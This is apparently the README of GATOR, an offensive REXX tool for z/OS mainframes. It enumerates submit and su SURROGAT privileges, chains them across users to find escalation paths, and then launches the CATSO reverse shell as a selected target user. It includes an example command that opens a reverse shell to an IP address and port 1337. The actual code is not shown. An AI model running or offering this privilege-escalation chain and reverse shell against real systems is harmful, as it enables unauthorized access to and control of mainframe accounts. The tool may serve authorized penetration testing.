# GATOR
SURROGAT CHAIN

# GATOR
z/OS Mainframe Surrogat Tool:   
Run this from a user  
It will find all submit and su SURROGATs that user has access to  
It will then attempt to find the same from that user  
It will dump all the users found and the LU of that user   
In the HLQ.PATHS and HLQ.LUSERS respectively   
Once you have a list of paths you can run GATOR is CATSO mode  
Select a target, and a ip and port for reverse shell  
This will then run the reverse shell CATSO  

INSTRUCTIONS:  
/* GATOR.rexx NEEDS TO BE IN HLQ.GATOR */  
/* CATSO.rexx NEEDS TO BE IN HLQ.CATSO */  
/* PASS WITH NO PARAMATER OR HLQ TO SETUP */  
/* IF NO PARMS PASSED, HLQ IS GATOR */  

PARAMATERS:  
parse arg HLQ INS INS_ARGS  
/* EX 'GATOR.GATOR' 'GATOR'  
/* CHOOSE A TARGET IN THE HLQ.PATHS PDSE AND RUN FOLLOWING */  
/* EX 'GATOR.GATOR' 'GATOR CATSO PRIVA1,172.16.0.54,1337' */  


Example output is in the GATOR.LUSERS AND GATOR.PATHS ALREADY  
All the GATOR code is in GATOR.GATOR  
CATSO is from https://github.com/mainframed/TShOcker/blob/master/CATSO.rexx  


Uploaded to GIT with https://github.com/wizardofzos/zigi/ <3  
Can clone it onto your system  
